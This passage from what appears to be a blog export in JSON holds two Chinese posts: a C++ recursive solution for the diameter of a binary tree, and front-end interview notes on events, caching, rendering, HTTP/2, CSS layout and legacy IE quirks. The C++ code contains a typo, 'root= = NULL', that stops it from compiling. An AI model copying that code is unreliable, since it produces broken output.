解题思路\\n\\n求2叉树的两节点的最长路径，可以不经过根节点。老套路递归，返回当前节点的左右子树的最长路径的解（res不经过当前节点），一条打算经过当前节点的最长路径，比较右边最大的解，左边最大的解，以及左右和起来的最大的解。\\n\\n<pre class=\\\"brush:cpp;\\\" >\\n/**\\n * Definition for a binary tree node.\\n * struct TreeNode {\\n *     int val;\\n *     TreeNode *left;\\n *     TreeNode *right;\\n *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}\\n * };\\n */\\n \\n struct Node{\\n     int res;\\n     int max;\\n     Node(int res,int max):res(res),max(max){}\\n };\\nclass Solution {\\npublic:\\n    int diameterOfBinaryTree(TreeNode* root) {\\n        if(root= = NULL){return 0;}\\n        Node n=run(root);\\n        return n.res-1;\\n    }\\n    Node run(TreeNode* root){\\n        if(root==NULL){\\n            return Node(0,0);\\n        }\\n        Node a=run(root->left);\\n        Node b=run(root->right);\\n        return Node(max(max(a.res,b.res),a.max+b.max+1),max(a.max+1,b.max+1));\\n    }\\n};\\n</pre>\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>解题思路</p>\n</blockquote>\n<p>求2叉树的两节点的最长路径，可以不经过根节点。老套路递归，返回当前节点的左右子树的最长路径的解（res不经过当前节点），一条打算经过当前节点的最长路径，比较右边最大的解，左边最大的解，以及左右和起来的最大的解。</p>\n<pre class=\"brush:cpp;\" >\n/**\n * Definition for a binary tree node.\n * struct TreeNode {\n *     int val;\n *     TreeNode *left;\n *     TreeNode *right;\n *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}\n * };\n */\n \n struct Node{\n     int res;\n     int max;\n     Node(int res,int max):res(res),max(max){}\n };\nclass Solution {\npublic:\n    int diameterOfBinaryTree(TreeNode* root) {\n        if(root= = NULL){return 0;}\n        Node n=run(root);\n        return n.res-1;\n    }\n    Node run(TreeNode* root){\n        if(root==NULL){\n            return Node(0,0);\n        }\n        Node a=run(root->left);\n        Node b=run(root->right);\n        return Node(max(max(a.res,b.res),a.max+b.max+1),max(a.max+1,b.max+1));\n    }\n};\n</pre><!--kg-card-end: markdown-->","comment_id":"104","plaintext":"> 解题思路\n\n\n求2叉树的两节点的最长路径，可以不经过根节点。老套路递归，返回当前节点的左右子树的最长路径的解（res不经过当前节点），一条打算经过当前节点的最长路径，比较右边最大的解，左边最大的解，以及左右和起来的最大的解。\n\n\n/**\n * Definition for a binary tree node.\n * struct TreeNode {\n *     int val;\n *     TreeNode *left;\n *     TreeNode *right;\n *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}\n * };\n */\n \n struct Node{\n     int res;\n     int max;\n     Node(int res,int max):res(res),max(max){}\n };\nclass Solution {\npublic:\n    int diameterOfBinaryTree(TreeNode* root) {\n        if(root= = NULL){return 0;}\n        Node n=run(root);\n        return n.res-1;\n    }\n    Node run(TreeNode* root){\n        if(root==NULL){\n            return Node(0,0);\n        }\n        Node a=run(root->left);\n        Node b=run(root->right);\n        return Node(max(max(a.res,b.res),a.max+b.max+1),max(a.max+1,b.max+1));\n    }\n};","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-27T10:37:50.000Z","created_by":"1","updated_at":"2017-03-27T10:58:27.000Z","updated_by":"1","published_at":"2017-03-20T10:37:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d325","uuid":"e1043cce-5d0f-4b6e-aaf6-020ff024051f","title":"面试准备+复习","slug":"mian-shi-ti","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 功能:停止事件冒泡  \\n\\nevent.stopPropagation( );  // W3C,阻止事件冒泡  \\nevent.cancelBubble = true; //在IE下 \\n\\n> 功能：阻止事件默认行为\\n\\nevent.preventDefault();// W3C addEventListener\\nevent.returnValue = false; //在IE下 \\nreturn false;//通过on这种方式的绑定的，使用return false;\\n\\n> 浏览器缓存控制机制\\n\\nhttps://juejin.im/entry/5ad86c16f265da505a77dca4\\n\\n* Expires\\n* Cache-control：max-age策略\\n* Last-Modified/If-Modified-Since\\n* Etag\\n\\n> AMD / CMD\\n\\nAMD 是 RequireJS 在推广过程中对模块定义的规范化产出。AMD 是提前执行，依赖前置。\\n```\\ndefine(['./a', './b'], function(a, b) {  // 依赖必须一开始就写好\\n    a.doSomething()\\n    // 此处略去 100 行\\n    b.doSomething()\\n    ...\\n}) \\n```\\nCMD 是 SeaJS 在推广过程中对模块定义的规范化产出。CMD 是延迟执行，依赖就近。\\n```\\ndefine(function(require, exports, module) {\\n   var a = require('./a')\\n   a.doSomething()   // 此处略去 100 行\\n   var b = require('./b') // 依赖可以就近书写\\n   b.doSomething()   // ... \\n})\\n```\\n\\n> js加载\\n\\n默认情况javascript是同步加载的，也就是javascript的加载时阻塞的。因此js加载要放后最后。也可以加上defer/async,或者动态创建script标签。前端图片等资源，是等html下载完成后，发起多线程请求加载。\\n\\n\\n>  dom渲染\\n\\n* 浏览器会解析三个东西：一个是HTML/SVG/XHTML，事实上，Webkit有三个C++的类对应这三类文档。解析这三种文件会产生一个DOM Tree。CSS，解析CSS会产生CSS规则树。Javascript，脚本，主要是通过DOM API和CSSOM API来操作DOM Tree和CSS Rule Tree.\\n* 解析完成后，浏览器引擎会通过DOM Tree 和 CSS Rule Tree 来构造 Rendering Tree。注意：Rendering Tree 渲染树并不等同于DOM树，因为一些像Header或display:none的东西就没必要放在渲染树中了。CSS 的 Rule Tree主要是为了完成匹配并把CSS Rule附加上Rendering Tree上的每个Element。也就是DOM结点。也就是所谓的Frame。然后，计算每个Frame（也就是每个Element）的位置，这又叫layout和reflow过程。\\n* 最后通过调用操作系统Native GUI的API绘制。转自[知乎](https://www.zhihu.com/question/20117417/answer/22359160)\\n* 因此，要把css放head中。\\n\\n> Reflow 和 Repaint\\n\\nRepaint「重绘」改变 DOM 元素的视觉效果，如颜色，透明度，隐藏(visibility),outline 。一般自会递归自身和子元素。\\nReflow「回流」，不仅会改变自己，还会影响别的元素。因此在要尽量避免这样的开销。比如一个元素大小改变了，一般会影响别的元素的布局。如display。\\n###### 减少回流\\n* 不要用 inline style 或 table 布局；\\n* 如果想设定元素的样式，通过改变元素的 class 名 (尽可能在 DOM 树的最里层)；\\n* 用于表现动画的元素，使用 position 属性的 fixed 值或 absolute 值（脱离文档流）；\\n* 减少不必要的 DOM 层级；\\n* 避免设置多项内联样；；\\n\\n> HTTP协议 “无连接，无状态”\\n\\n==无连接==\\n\\n* HTTP/1.0 指的是每次连接只处理一个请求，服务端处理完客户端一次请求，等到客户端作出回应之后便断开连接；这种方式有利于节省服务器资源.明显，HTTP1.0，会在建立和断开连接上花费大部分时间；\\n* HTTP/1.1 Keep-Alive提出来解决上面的问题，且持久连接称为了默认的连接方式。但是线端阻塞(head-of-line blocking), 它是指一个连接(connection)一次只提交一个请求的效率比较高, 多了就会变慢。 HTTP/1.1 试过用流水线(pipelining)来解决这个问题, 但是效果并不理想(数据量较大或者速度较慢的响应, 会阻碍排在他后面的请求). \\n* HTTP/2是完全多路复用的，而非有序并阻塞的——只需一个连接即可实现并行\\n\\n==无状态==\\n\\n* 无状态是指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。即我们给服务器发送 HTTP 请求之后，服务器根据请求，会给我们发送数据过来，但是，发送完，不会记录任何信息。这样明显是不行的。Cookie+Session应运而生。\\n\\n> HTTP 2.0与HTTP 1.1区别\\n\\n* HTTP/2采用二进制格式而非文本格式\\n* HTTP/2是完全多路复用的，而非有序并阻塞的——只需一个连接即可实现并行\\n* 使用报头压缩，HTTP/2降低了开销\\n* HTTP/2让服务器可以将响应主动“推送”到客户端缓存中\\n\\n> X-UA-Compatible\\n\\n指定IE=edge来指示IE使用它支持的最高模式。\\n添加http头add_header \\\"X-UA-Compatible\\\" \\\"IE=Edge\\\";\\n```\\n<meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\">\\n```\\n\\n> Google PageSpeed\\n\\nGoogle提供了 PageSpeed工具，这是一个浏览器插件，可以很好地应用上文中Google所提到的Web优化实践——帮助你轻松对网站的性能瓶颈进行分析，并为你提供优化建议。\\n\\n> 301与302的区别\\n\\n301 redirect: 301 代表永久性转移(Permanently Moved)。\\n302 redirect: 302 代表暂时性转移(Temporarily Moved )。\\n\\n* 对用户来说没有区别，他们看到效果只是一个跳转\\n* 对于引擎及站长:302转向可能会有URL规范化及网址劫持的问题。可能被搜索引擎判为可疑转向，甚至认为是作弊。\\n\\n> 字符串拼接\\n\\n在Javascript中使用\\\"+\\\"号来拼接字符串效率是比较低的，因为每次运行都会开辟新的内存并生成新的字符串变量，然后将拼接结果赋值给新变量。与之相比更为高效的做法是使用数组的join方法，即将需要拼接的字符串放在数组中最后调用其join方法得到结果。\\n\\n> css关系选择符\\n\\n* E F 选择所有被E元素包含的F元素。\\n* E>F 选择所有作为E元素的子元素F。\\n* E+F 选择紧贴在E元素之后F元素。\\n* E~F 选择E元素后面的所有兄弟元素F。\\n\\n> 事件触发器\\n\\n* fireEvent  ==IE==\\n* dispatchEvent ==其他高级浏览器==\\n```\\nvar fireEvent = function(element,event){  \\n        if (document.createEventObject){  \\n            // IE浏览器支持fireEvent方法  \\n            var evt = document.createEventObject();  \\n            return element.fireEvent('on'+event,evt)  \\n        }  \\n        else{  \\n            // 其他标准浏览器使用dispatchEvent方法  \\n            var evt = document.createEvent( 'HTMLEvents' );  \\n            evt.initEvent(event, true, true);  \\n            return !element.dispatchEvent(evt);  \\n        }  \\n}; \\n```\\n> 事件监听/取消\\n\\n* attachevent detachEvent ==IE下事件名称+on==\\n* addeventlistener removeEventListener\\n\\n> Javascript内存泄露\\n\\n* 循环引用 ==一个 DOM 对象被一个 Javascript 对象引用，与此同时又引用同一个或其它的 Javascript 对象，这个 DOM 对象可能会引发内存泄露。IE 6, 7中有一部分对象并不是原生js对象。例如，其DOM和BOM中的对象就是使用C++以COM对象的形式实现的，而COM对象的垃圾回收机制采用的就是引用计数策略。这样就会触发循环引用，引起内存泄露==\\n* Javascript闭包\\n* DOM插入\\n\\n> JavaScript 垃圾回收机制\\n\\n* 引用计数法 ==早期IE采用的。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。==\\n* 标记清除法 ==当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。更新的更好的方法。==\\n\\n> text-overflow: clip|ellipsis|string;\\n```\\nclip 修剪文本。\\t\\nellipsis 显示省略符号来代表被修剪的文本。\\nstring 使用给定的字符串来代表被修剪的文本。\\n```\\n\\n> whiteSpace: normal|pre|nowrap|pre-wrap|pre-line|inherit\\n```\\nnormal\\t默认。空白会被浏览器忽略。\\npre\\t空白会被浏览器保留。其行为方式类似 HTML 中的 <pre> 标签。\\nnowrap\\t文本不会换行，文本会在在同一行上继续，直到遇到 <br> 标签为止。\\npre-wrap\\t保留空白符序列，但是正常地进行换行。\\npre-line\\t合并空白符序列，但是保留换行符。\\ninherit\\t规定应该从父元素继承 white-space 属性的值。\\n```\\n\\n> box-sizing content-box|border-box\\n\\n* content-box W3C盒模型\\n* border-box 和IE盒模型一样（新的盒模型）\\n\\n> link和@import区别\\n\\n* link属于XHTML标签，除了加载CSS外，还能用于定义RSS, 定义rel连接属性等作用;而@import是CSS提供的，只能用于加载CSS;\\n* 页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;\\n* import是CSS2.1 提出的，只在IE5以上才能被识别，而link是XHTML标签，无兼容问题;\\n\\n> HTML5为什么只需要写<!DOCTYPE HTML>?\\n\\nHtml5不基于SGML,因此不需要对DTD进行引用，但是需要doctype来规范浏览器的行为（让浏览器按照他们应该的方式来运行）而HTML4.01基于SGML，所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型。\\n\\n> Margin垂直塌陷(collapse)问题\\n\\n折叠的产生情况：\\n\\n1.必须是处于常规文档流（非float和绝对定位）的块级盒子,并且处于同一个BFC当中。\\n\\n2.没有线盒，没有空隙（clearance，下面会讲到），没有padding和border将他们分隔开(ps \\n:所以解决办法中有padding或者border两种办法)\\n\\n3.都属于垂直方向上相邻的外边距，\\n\\n解决办法：\\n加border|padding|overflow:hidden\\n\\n> 对BFC规范(块级格式化上下文：block formatting context)的理解？\\n\\nBFC (Block Formatting Contexts) 即块级格式化上下文，从样式上看，它与普通的容器没有什么区别，但是从功能上，BFC 可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器没有的一些特性，例如可以包含浮动元素，（如 overflow 方法）就是触发了父元素的 BFC ，使到它可以包含浮动元素，从而防止出现高度塌陷的问题。(在IE6-7中没有BFC，但是有hasLayout和BFC有相似的功能，*zoom: 1 触发 hasLayout)\\n\\n> 移动端最小触控区域是多大?\\n\\nMIT的一项研究指出，大多数成年人的食指宽度为16-20mm，换算后大约为45-57px。Apple的44px*44px操作起来就很舒适了。\\n\\n> 页面编码和被请求的资源编码(如js)如果不一致如何处理?\\n\\n```\\nhttp://www.yyy.com/a.html 中嵌入了一个http://www.xxx.com/test.js\\na.html 的编码是gbk或gb2312的。 而引入的js编码为utf-8的 ，那就需要在引入的时候\\n<script src=\\\"http://www.xxx.com/test.js\\\" charset=\\\"utf-8\\\"></script>\\n同理，如果你的页面是utf-8的，引入的js是gbk的，那么就需要加上charset=\\\"gbk\\\".\\n```\\n\\n> javascript里面的继承怎么实现，如何避免原型链上面的对象共享\\n\\n利用原型来继承,通过增加一个空的函数来避免原型链上的对象共享\\n```\\nfunction Cat(name){  \\nAnimal.call(this);  \\nthis.name = name || 'Tom';\\n}\\n(function(){  // 创建一个没有实例方法的类  \\nvar Super = function(){};  \\nSuper.prototype = Animal.prototype;  \\n//将实例作为子类的原型  Cat.prototype = new Super();\\n})();\\n```\\n\\n>　如何保证一致性的代码风格\\n\\nJSLint|JSHint|ESLint|JSCS。在团队开发中，这些工具对于编写代码非常的有帮助，能够帮助团队开发者强制执行规定的风格指南，还能够通过静态分析捕获常见的错误。\\n\\n> CSS Hack\\n\\nIE6：_\\nIE7：+\\nIE6 & IE7：*\\nIE6 & IE7 & IE8 & IE9 & IE10：\\\\9\\nIE8 & IE9 & IE10:\\\\0\\nIE9 & IE10：\\\\9\\\\0\\n\\n> createDocumentFragment\\n\\ncreateDocumentFragment方法用来创建一个DocumentFragment。在前面我们说到DocumentFragment表示一种轻量级的文档，它的作用主要是存储临时的节点用来准备添加到文档中，解决添加大量节点时的性能问题。\\n(今天，面试被问了。)\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>功能:停止事件冒泡</p>\n</blockquote>\n<p>event.stopPropagation( );  // W3C,阻止事件冒泡<br>\nevent.cancelBubble = true; //在IE下</p>\n<blockquote>\n<p>功能：阻止事件默认行为</p>\n</blockquote>\n<p>event.preventDefault();// W3C addEventListener<br>\nevent.returnValue = false; //在IE下<br>\nreturn false;//通过on这种方式的绑定的，使用return false;</p>\n<blockquote>\n<p>浏览器缓存控制机制</p>\n</blockquote>\n<p><a href=\"https://juejin.im/entry/5ad86c16f265da505a77dca4\">https://juejin.im/entry/5ad86c16f265da505a77dca4</a></p>\n<ul>\n<li>Expires</li>\n<li>Cache-control：max-age策略</li>\n<li>Last-Modified/If-Modified-Since</li>\n<li>Etag</li>\n</ul>\n<blockquote>\n<p>AMD / CMD</p>\n</blockquote>\n<p>AMD 是 RequireJS 在推广过程中对模块定义的规范化产出。AMD 是提前执行，依赖前置。</p>\n<pre><code>define(['./a', './b'], function(a, b) {  // 依赖必须一开始就写好\n    a.doSomething()\n    // 此处略去 100 行\n    b.doSomething()\n    ...\n}) \n</code></pre>\n<p>CMD 是 SeaJS 在推广过程中对模块定义的规范化产出。CMD 是延迟执行，依赖就近。</p>\n<pre><code>define(function(require, exports, module) {\n   var a = require('./a')\n   a.doSomething()   // 此处略去 100 行\n   var b = require('./b') // 依赖可以就近书写\n   b.doSomething()   // ... \n})\n</code></pre>\n<blockquote>\n<p>js加载</p>\n</blockquote>\n<p>默认情况javascript是同步加载的，也就是javascript的加载时阻塞的。因此js加载要放后最后。也可以加上defer/async,或者动态创建script标签。前端图片等资源，是等html下载完成后，发起多线程请求加载。</p>\n<blockquote>\n<p>dom渲染</p>\n</blockquote>\n<ul>\n<li>浏览器会解析三个东西：一个是HTML/SVG/XHTML，事实上，Webkit有三个C++的类对应这三类文档。解析这三种文件会产生一个DOM Tree。CSS，解析CSS会产生CSS规则树。Javascript，脚本，主要是通过DOM API和CSSOM API来操作DOM Tree和CSS Rule Tree.</li>\n<li>解析完成后，浏览器引擎会通过DOM Tree 和 CSS Rule Tree 来构造 Rendering Tree。注意：Rendering Tree 渲染树并不等同于DOM树，因为一些像Header或display:none的东西就没必要放在渲染树中了。CSS 的 Rule Tree主要是为了完成匹配并把CSS Rule附加上Rendering Tree上的每个Element。也就是DOM结点。也就是所谓的Frame。然后，计算每个Frame（也就是每个Element）的位置，这又叫layout和reflow过程。</li>\n<li>最后通过调用操作系统Native GUI的API绘制。转自<a href=\"https://www.zhihu.com/question/20117417/answer/22359160\">知乎</a></li>\n<li>因此，要把css放head中。</li>\n</ul>\n<blockquote>\n<p>Reflow 和 Repaint</p>\n</blockquote>\n<p>Repaint「重绘」改变 DOM 元素的视觉效果，如颜色，透明度，隐藏(visibility),outline 。一般自会递归自身和子元素。<br>\nReflow「回流」，不仅会改变自己，还会影响别的元素。因此在要尽量避免这样的开销。比如一个元素大小改变了，一般会影响别的元素的布局。如display。</p>\n<h6 id=\"\">减少回流</h6>\n<ul>\n<li>不要用 inline style 或 table 布局；</li>\n<li>如果想设定元素的样式，通过改变元素的 class 名 (尽可能在 DOM 树的最里层)；</li>\n<li>用于表现动画的元素，使用 position 属性的 fixed 值或 absolute 值（脱离文档流）；</li>\n<li>减少不必要的 DOM 层级；</li>\n<li>避免设置多项内联样；；</li>\n</ul>\n<blockquote>\n<p>HTTP协议 “无连接，无状态”</p>\n</blockquote>\n<p><mark>无连接</mark></p>\n<ul>\n<li>HTTP/1.0 指的是每次连接只处理一个请求，服务端处理完客户端一次请求，等到客户端作出回应之后便断开连接；这种方式有利于节省服务器资源.明显，HTTP1.0，会在建立和断开连接上花费大部分时间；</li>\n<li>HTTP/1.1 Keep-Alive提出来解决上面的问题，且持久连接称为了默认的连接方式。但是线端阻塞(head-of-line blocking), 它是指一个连接(connection)一次只提交一个请求的效率比较高, 多了就会变慢。 HTTP/1.1 试过用流水线(pipelining)来解决这个问题, 但是效果并不理想(数据量较大或者速度较慢的响应, 会阻碍排在他后面的请求).</li>\n<li>HTTP/2是完全多路复用的，而非有序并阻塞的——只需一个连接即可实现并行</li>\n</ul>\n<p><mark>无状态</mark></p>\n<ul>\n<li>无状态是指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。即我们给服务器发送 HTTP 请求之后，服务器根据请求，会给我们发送数据过来，但是，发送完，不会记录任何信息。这样明显是不行的。Cookie+Session应运而生。</li>\n</ul>\n<blockquote>\n<p>HTTP 2.0与HTTP 1.1区别</p>\n</blockquote>\n<ul>\n<li>HTTP/2采用二进制格式而非文本格式</li>\n<li>HTTP/2是完全多路复用的，而非有序并阻塞的——只需一个连接即可实现并行</li>\n<li>使用报头压缩，HTTP/2降低了开销</li>\n<li>HTTP/2让服务器可以将响应主动“推送”到客户端缓存中</li>\n</ul>\n<blockquote>\n<p>X-UA-Compatible</p>\n</blockquote>\n<p>指定IE=edge来指示IE使用它支持的最高模式。<br>\n添加http头add_header &quot;X-UA-Compatible&quot; &quot;IE=Edge&quot;;</p>\n<pre><code>&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;\n</code></pre>\n<blockquote>\n<p>Google PageSpeed</p>\n</blockquote>\n<p>Google提供了 PageSpeed工具，这是一个浏览器插件，可以很好地应用上文中Google所提到的Web优化实践——帮助你轻松对网站的性能瓶颈进行分析，并为你提供优化建议。</p>\n<blockquote>\n<p>301与302的区别</p>\n</blockquote>\n<p>301 redirect: 301 代表永久性转移(Permanently Moved)。<br>\n302 redirect: 302 代表暂时性转移(Temporarily Moved )。</p>\n<ul>\n<li>对用户来说没有区别，他们看到效果只是一个跳转</li>\n<li>对于引擎及站长:302转向可能会有URL规范化及网址劫持的问题。可能被搜索引擎判为可疑转向，甚至认为是作弊。</li>\n</ul>\n<blockquote>\n<p>字符串拼接</p>\n</blockquote>\n<p>在Javascript中使用&quot;+&quot;号来拼接字符串效率是比较低的，因为每次运行都会开辟新的内存并生成新的字符串变量，然后将拼接结果赋值给新变量。与之相比更为高效的做法是使用数组的join方法，即将需要拼接的字符串放在数组中最后调用其join方法得到结果。</p>\n<blockquote>\n<p>css关系选择符</p>\n</blockquote>\n<ul>\n<li>E F 选择所有被E元素包含的F元素。</li>\n<li>E&gt;F 选择所有作为E元素的子元素F。</li>\n<li>E+F 选择紧贴在E元素之后F元素。</li>\n<li>E~F 选择E元素后面的所有兄弟元素F。</li>\n</ul>\n<blockquote>\n<p>事件触发器</p>\n</blockquote>\n<ul>\n<li>fireEvent  <mark>IE</mark></li>\n<li>dispatchEvent <mark>其他高级浏览器</mark></li>\n</ul>\n<pre><code>var fireEvent = function(element,event){  \n        if (document.createEventObject){  \n            // IE浏览器支持fireEvent方法  \n            var evt = document.createEventObject();  \n            return element.fireEvent('on'+event,evt)  \n        }  \n        else{  \n            // 其他标准浏览器使用dispatchEvent方法  \n            var evt = document.createEvent( 'HTMLEvents' );  \n            evt.initEvent(event, true, true);  \n            return !element.dispatchEvent(evt);  \n        }  \n}; \n</code></pre>\n<blockquote>\n<p>事件监听/取消</p>\n</blockquote>\n<ul>\n<li>attachevent detachEvent <mark>IE下事件名称+on</mark></li>\n<li>addeventlistener removeEventListener</li>\n</ul>\n<blockquote>\n<p>Javascript内存泄露</p>\n</blockquote>\n<ul>\n<li>循环引用 <mark>一个 DOM 对象被一个 Javascript 对象引用，与此同时又引用同一个或其它的 Javascript 对象，这个 DOM 对象可能会引发内存泄露。IE 6, 7中有一部分对象并不是原生js对象。例如，其DOM和BOM中的对象就是使用C++以COM对象的形式实现的，而COM对象的垃圾回收机制采用的就是引用计数策略。这样就会触发循环引用，引起内存泄露</mark></li>\n<li>Javascript闭包</li>\n<li>DOM插入</li>\n</ul>\n<blockquote>\n<p>JavaScript 垃圾回收机制</p>\n</blockquote>\n<ul>\n<li>引用计数法 <mark>早期IE采用的。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。</mark></li>\n<li>标记清除法 <mark>当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。更新的更好的方法。</mark></li>\n</ul>\n<blockquote>\n<p>text-overflow: clip|ellipsis|string;</p>\n</blockquote>\n<pre><code>clip 修剪文本。\t\nellipsis 显示省略符号来代表被修剪的文本。\nstring 使用给定的字符串来代表被修剪的文本。\n</code></pre>\n<blockquote>\n<p>whiteSpace: normal|pre|nowrap|pre-wrap|pre-line|inherit</p>\n</blockquote>\n<pre><code>normal\t默认。空白会被浏览器忽略。\npre\t空白会被浏览器保留。其行为方式类似 HTML 中的 &lt;pre&gt; 标签。\nnowrap\t文本不会换行，文本会在在同一行上继续，直到遇到 &lt;br&gt; 标签为止。\npre-wrap\t保留空白符序列，但是正常地进行换行。\npre-line\t合并空白符序列，但是保留换行符。\ninherit\t规定应该从父元素继承 white-space 属性的值。\n</code></pre>\n<blockquote>\n<p>box-sizing content-box|border-box</p>\n</blockquote>\n<ul>\n<li>content-box W3C盒模型</li>\n<li>border-box 和IE盒模型一样（新的盒模型）</li>\n</ul>\n<blockquote>\n<p>link和@import区别</p>\n</blockquote>\n<ul>\n<li>link属于XHTML标签，除了加载CSS外，还能用于定义RSS, 定义rel连接属性等作用;而@import是CSS提供的，只能用于加载CSS;</li>\n<li>页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;</li>\n<li>import是CSS2.1 提出的，只在IE5以上才能被识别，而link是XHTML标签，无兼容问题;</li>\n</ul>\n<blockquote>\n<p>HTML5为什么只需要写<!DOCTYPE HTML>?</p>\n</blockquote>\n<p>Html5不基于SGML,因此不需要对DTD进行引用，但是需要doctype来规范浏览器的行为（让浏览器按照他们应该的方式来运行）而HTML4.01基于SGML，所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型。</p>\n<blockquote>\n<p>Margin垂直塌陷(collapse)问题</p>\n</blockquote>\n<p>折叠的产生情况：</p>\n<p>1.必须是处于常规文档流（非float和绝对定位）的块级盒子,并且处于同一个BFC当中。</p>\n<p>2.没有线盒，没有空隙（clearance，下面会讲到），没有padding和border将他们分隔开(ps<br>\n:所以解决办法中有padding或者border两种办法)</p>\n<p>3.都属于垂直方向上相邻的外边距，</p>\n<p>解决办法：<br>\n加border|padding|overflow:hidden</p>\n<blockquote>\n<p>对BFC规范(块级格式化上下文：block formatting context)的理解？</p>\n</blockquote>\n<p>BFC (Block Formatting Contexts) 即块级格式化上下文，从样式上看，它与普通的容器没有什么区别，但是从功能上，BFC 可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器没有的一些特性，例如可以包含浮动元素，（如 overflow 方法）就是触发了父元素的 BFC ，使到它可以包含浮动元素，从而防止出现高度塌陷的问题。(在IE6-7中没有BFC，但是有hasLayout和BFC有相似的功能，*zoom: 1 触发 hasLayout)</p>\n<blockquote>\n<p>移动端最小触控区域是多大?</p>\n</blockquote>\n<p>MIT的一项研究指出，大多数成年人的食指宽度为16-20mm，换算后大约为45-57px。Apple的44px*44px操作起来就很舒适了。</p>\n<blockquote>\n<p>页面编码和被请求的资源编码(如js)如果不一致如何处理?</p>\n</blockquote>\n<pre><code>http://www.yyy.com/a.html 中嵌入了一个http://www.xxx.com/test.js\na.html 的编码是gbk或gb2312的。 而引入的js编码为utf-8的 ，那就需要在引入的时候\n&lt;script src=&quot;http://www.xxx.com/test.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;\n同理，如果你的页面是utf-8的，引入的js是gbk的，那么就需要加上charset=&quot;gbk&quot;.\n</code></pre>\n<blockquote>\n<p>javascript里面的继承怎么实现，如何避免原型链上面的对象共享</p>\n</blockquote>\n<p>利用原型来继承,通过增加一个空的函数来避免原型链上的对象共享</p>\n<pre><code>function Cat(name){  \nAnimal.call(this);  \nthis.name = name || 'Tom';\n}\n(function(){  // 创建一个没有实例方法的类  \nvar Super = function(){};  \nSuper.prototype = Animal.prototype;  \n//将实例作为子类的原型  Cat.prototype = new Super();\n})();\n</code></pre>\n<blockquote>\n<p>如何保证一致性的代码风格</p>\n</blockquote>\n<p>JSLint|JSHint|ESLint|JSCS。在团队开发中，这些工具对于编写代码非常的有帮助，能够帮助团队开发者强制执行规定的风格指南，还能够通过静态分析捕获常见的错误。</p>\n<blockquote>\n<p>CSS Hack</p>\n</blockquote>\n<p>IE6：_<br>\nIE7：+<br>\nIE6 &amp; IE7：*<br>\nIE6 &amp; IE7 &amp; IE8 &amp; IE9 &amp; IE10：\\9<br>\nIE8 &amp; IE9 &amp; IE10:\\0<br>\nIE9 &amp; IE10：\\9\\0</p>\n<blockquote>\n<p>createDocumentFragment</p>\n</blockquote>\n<p>createDocumentFragment方法用来创建一个DocumentFragment。在前面我们说到DocumentFragment表示一种轻量级的文档，它的作用主要是存储临时的节点用来准备添加到文档中，解决添加大量节点时的性能问题。<br>\n(今天，面试被问了。)</p>\n<!--kg-card-end: markdown-->","comment_id":"105","plaintext":"> 功能:停止事件冒泡\n\n\nevent.stopPropagation( ); // W3C,阻止事件冒泡\nevent.cancelBubble = true; //在IE下\n\n> 功能：阻止事件默认行为\n\n\nevent.preventDefault();// W3C addEventListener\nevent.returnValue = false; //在IE下\nreturn false;//通过on这种方式的绑定的，使用return false;\n\n> 浏览器缓存控制机制\n\n\nhttps://juejin.im/entry/5ad86c16f265da505a77dca4\n\n * Expires\n * Cache-control：max-age策略\n * Last-Modified/If-Modified-Since\n * Etag\n\n> AMD / CMD\n\n\nAMD 是 RequireJS 在推广过程中对模块定义的规范化产出。AMD 是提前执行，依赖前置。\n\ndefine(['./a', './b'], function(a, b) {  // 依赖必须一开始就写好\n    a.doSomething()\n    // 此处略去 100 行\n    b.doSomething()\n    ...\n}) \n\n\nCMD 是 SeaJS 在推广过程中对模块定义的规范化产出。CMD 是延迟执行，依赖就近。\n\ndefine(function(require, exports, module) {\n   var a = require('./a')\n   a.doSomething()   // 此处略去 100 行\n   var b = require('./b') // 依赖可以就近书写\n   b.doSomething()   // ... \n})\n\n\n> 